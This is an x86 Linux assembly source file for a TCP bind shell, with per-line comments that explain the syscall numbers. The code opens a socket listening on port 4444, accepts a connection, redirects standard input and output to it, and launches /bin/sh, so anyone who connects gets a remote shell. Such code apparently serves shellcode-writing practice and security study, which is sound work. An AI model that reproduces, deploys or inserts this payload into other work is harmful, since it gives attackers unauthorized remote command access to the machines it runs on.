; TCP Bind Shell
; Author: geobour98 

global _start

section .text

_start:
	; socket 
	xor eax, eax
	mov ax, 0x167		; 167 is the hex value of the decimal 359 for socket

	xor ebx, ebx
	mov bl, 0x2		; AF_INET numeric value from PF_INET protocol family

	xor ecx, ecx
	mov cl, 0x1		; SOCK_STREAM constant from socket_type.h

	xor edx, edx		; 0 value because of single protocol	

	int 0x80		; exec socket syscall 

	mov ebx, eax		; move sockfd (file descriptor) value into ebx

	; bind
	xor eax, eax
	mov ax, 0x169		; 169 is the hex value of the decimal 361 for bind
	
	push edx 		; listens on all addresses (0.0.0.0)

	push word 0x5c11	; listen on port 4444 (little endian)

	push word 0x2		; AF_INET constant
	
	xor ecx, ecx
	mov ecx, esp		; ecx now points at address struct at the top of the stack

	xor edx, edx
	mov dl, 0x10		; 10 is the decimal 16 that is the size of the address struct

	int 0x80		; exec bind syscall

	xor ecx, ecx		; clear ecx

	; listen
	xor eax, eax
	mov ax, 0x16b		; 16b is the hex value of the decimal 363 for listen

	xor edx, edx
	push edx		; backlog value is 0

	push ebx		; sockfd
	
	int 0x80		; exec listen syscall

	; accept4
	xor eax, eax
	mov ax, 0x16c		; 16c is the hex value of the decimal 364 for accept4

	push edx		; 0
	push edx		; NULL argument
	push edx		; NULL argument

	push ebx		; sockfd

	int 0x80		; exec accept4 syscall

	mov ebx, eax		; acceptfd

	; dup2 loop
	xor ecx, ecx
	mov cl, 0x3		; set counter to 3

dup2loop:
	xor eax, eax
	mov al, 0x3f		; 3f is the hex value of the decimal 63 for dup2

	dec cl			; decrement counter by 1

	int 0x80		; exec dup2 syscall

	jnz dup2loop		; jump to loop if ZF is not zero, else continue

	; execve
	xor eax, eax
	mov al, 0xb		; b is the hex value of the decimal 11 for execve        

	xor ebx, ebx
	push ebx		; NULL argument
	push ebx		; NULL argument
	push ebx		; null terminator

        ; PUSH /bin//sh
        push 0x68732f2f		; "hs//"
        push 0x6e69622f		; "nib/"

	mov ebx, esp		; ebx points at "/bin//sh" at the top of the stack

	int 0x80		; exec execve syscall
